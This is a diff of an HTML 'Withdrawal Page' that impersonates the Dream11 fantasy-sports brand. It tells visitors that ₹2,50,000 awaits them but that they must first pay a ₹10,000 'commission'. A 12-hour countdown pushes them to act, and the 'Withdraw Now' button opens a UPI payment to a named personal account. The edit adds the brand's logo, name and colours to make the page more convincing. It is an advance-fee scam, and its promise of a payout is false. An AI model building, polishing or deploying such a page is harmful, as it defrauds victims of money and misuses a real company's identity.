@@ -1,103 +1,110 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Withdrawal Page</title>
   <style>
     body {
-      font-family: Arial, sans-serif;
-      background: #f5f5f5;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
+      margin: 0;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background-color: #d60000;
     }
-    .card {
-      background: white;
-      padding: 30px;
-      border-radius: 15px;
-      box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+
+    .container {
+      max-width: 360px;
+      margin: 60px auto;
+      background: #fff;
+      padding: 30px 20px;
+      border-radius: 20px;
       text-align: center;
-      max-width: 90%;
+      box-shadow: 0px 8px 16px rgba(0, 0, 0, 0.25);
     }
-    h2 {
+
+    .logo {
+      width: 60px;
+      margin-bottom: 5px;
+    }
+
+    .dream11-text {
+      color: #d60000;
+      font-size: 18px;
+      font-weight: bold;
       margin-bottom: 10px;
     }
+
+    h2 {
+      margin: 10px 0;
+      font-size: 22px;
+    }
+
     .amount {
-      font-size: 20px;
+      color: #28a745;
+      font-size: 32px;
       font-weight: bold;
       margin: 10px 0;
     }
-    .note {
-      color: #555;
+
+    .info {
+      font-size: 15px;
+      color: #000;
+      margin: 10px 0 15px;
+    }
+
+    .timer {
+      font-size: 18px;
+      color: red;
+      font-weight: bold;
       margin-bottom: 20px;
     }
-    .timer {
-      font-size: 16px;
-      color: red;
-      margin-bottom: 15px;
-    }
+
     .btn {
-      background: #28a745;
+      background-color: #28a745;
       color: white;
-      padding: 12px 25px;
+      padding: 14px 30px;
+      font-size: 16px;
       border: none;
       border-radius: 8px;
-      font-size: 16px;
       cursor: pointer;
     }
-    .btn:disabled {
-      background: gray;
-      cursor: not-allowed;
+
+    .btn:hover {
+      background-color: #1e7e34;
     }
   </style>
 </head>
 <body>
-  <div class="card">
+  <div class="container">
+    <img src="1000076820.jpg" alt="Dream11 Logo" class="logo" />
+    <div class="dream11-text">DREAM11</div>
     <h2>Withdrawal Page</h2>
-    <p class="amount">Your withdrawal amount is: ₹2,50,000</p>
-    <p class="note">You must pay <strong>₹10,000 commission</strong> to proceed with withdrawal.</p>
-    <div id="timer" class="timer"></div>
-    <button id="withdrawBtn" class="btn">Withdraw Now</button>
+    <p>Your withdrawal amount is:</p>
+    <div class="amount">₹2,50,000</div>
+    <p class="info">You must pay ₹10,000 commission to proceed with withdrawal.</p>
+    <div class="timer" id="countdown">Time left: 12:00:00</div>
+    <button class="btn" id="withdrawBtn">Withdraw Now</button>
   </div>
 
   <script>
-    const btn = document.getElementById('withdrawBtn');
-    const timerDisplay = document.getElementById('timer');
+    // Countdown
+    const countdownEl = document.getElementById("countdown");
+    let totalSeconds = 12 * 60 * 60;
 
-    const countdownHours = 12;
-    const firstVisit = localStorage.getItem('withdrawalStart');
-    const startTime = firstVisit ? parseInt(firstVisit) : Date.now();
-
-    if (!firstVisit) {
-      localStorage.setItem('withdrawalStart', startTime);
+    function updateCountdown() {
+      let hours = Math.floor(totalSeconds / 3600);
+      let minutes = Math.floor((totalSeconds % 3600) / 60);
+      let seconds = totalSeconds % 60;
+      countdownEl.textContent = `Time left: ${hours.toString().padStart(2, '0')}:${minutes
+        .toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+      if (totalSeconds > 0) totalSeconds--;
     }
 
-    function updateTimer() {
-      const now = Date.now();
-      const endTime = startTime + countdownHours * 60 * 60 * 1000;
-      const timeLeft = endTime - now;
+    setInterval(updateCountdown, 1000);
 
-      if (timeLeft <= 0) {
-        timerDisplay.innerText = "Link Expired";
-        btn.disabled = true;
-        btn.innerText = "Link Expired";
-        return;
-      }
-
-      const hours = Math.floor(timeLeft / (1000 * 60 * 60));
-      const minutes = Math.floor((timeLeft % (1000 * 60 * 60)) / (1000 * 60));
-      const seconds = Math.floor((timeLeft % (1000 * 60)) / 1000);
-
-      timerDisplay.innerText = `Link valid for: ${hours}h ${minutes}m ${seconds}s`;
-    }
-
-    updateTimer();
-    setInterval(updateTimer, 1000);
-
-    btn.onclick = () => {
-      const upiLink = `upi://pay?pa=ramchoudhary2315@ybl&pn=Ram%20Choudhary&am=10000&cu=INR`;
-      window.location.href = upiLink;
-    };
+    // UPI Payment
+    document.getElementById("withdrawBtn").addEventListener("click", () => {
+      window.location.href = "upi://pay?pa=ramchoudhary2315@ybl&pn=Ram%20Choudhary&am=10000&cu=INR";
+    });
   </script>
 </body>
 </html>
